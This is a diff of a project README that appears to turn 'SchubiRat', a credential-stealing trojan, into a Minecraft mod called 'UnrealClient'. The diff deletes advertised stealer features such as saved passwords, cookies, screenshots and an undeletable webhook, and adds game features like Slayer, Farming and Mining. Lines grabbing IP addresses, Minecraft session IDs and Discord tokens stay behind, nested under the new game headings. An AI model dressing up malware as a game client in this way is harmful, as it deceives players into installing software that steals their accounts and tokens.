@@ -5,9 +5,11 @@
 All previous issues should be solved with the latest release
 
 # Features
-- Impossible to delete the webhook
-- Good spam protection
-- Grabs
+#### Auto Harp/Exprimantel table
+- Combat
+    - sss
+- Slayer
+- Farming
     - IP
     - Minecraft Session ID
     - Discord Tokens from:
@@ -16,15 +18,9 @@ All previous issues should be solved with the latest release
         - Discord Canary
         - Lightcord
         - Every popular chromium based browser
-    - Saved browser passwords
-    - Cookies
-    - Browser history
-    - Desktop screenshot
-    - Minecraft accounts saved in lunar client
-    - Minecraft accounts saved in essential
-- Bypasses the restrictions on the max allowed key lenght
-- Isn't reliant on any third party file hosting service like [Anonfiles](https://anonfiles.com) or [Gofile](https://gofile.io)
-- Embeds and webhook customizable, no watermark
+    - Mining
+    - F7 Features
+
 
 # Setup
 ## Server
@@ -96,4 +92,4 @@ The config is not reloaded automatically, so you have to restart the server for 
 
 
 
-[get back to the top](https://github.com/Schubilegend/SchubiRat#)
+[get back to the top](https://github.com/Unrealsforkick/UnrealClient)
